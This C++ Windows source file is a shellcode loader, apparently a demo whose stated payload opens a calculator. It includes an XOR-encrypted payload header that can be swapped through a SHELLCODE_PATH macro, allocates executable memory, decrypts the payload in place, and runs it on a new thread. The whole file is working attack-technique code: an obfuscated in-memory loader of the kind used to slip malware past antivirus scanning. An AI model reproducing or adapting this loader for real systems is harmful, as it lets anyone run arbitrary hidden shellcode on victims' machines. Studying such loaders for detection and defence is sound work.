// This program's goal is to try to create a new process to execute a shellcode that will open a calculator

#include <windows.h>

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/xored_calc.hpp"
#endif

unsigned char key[] = "salut";

// This function will xor the payload with the key in order to decrypt it
void decrypt_payload(unsigned char* payload, unsigned int payload_size, unsigned char key[], unsigned int key_size)
{
	for (unsigned int i = 0; i < payload_size; i++)
	{
		payload[i] ^= key[i % key_size];
	}
}

int main()
{
	// Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

	// Move the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

	// Decrypt the payload
	decrypt_payload((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));

	// Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
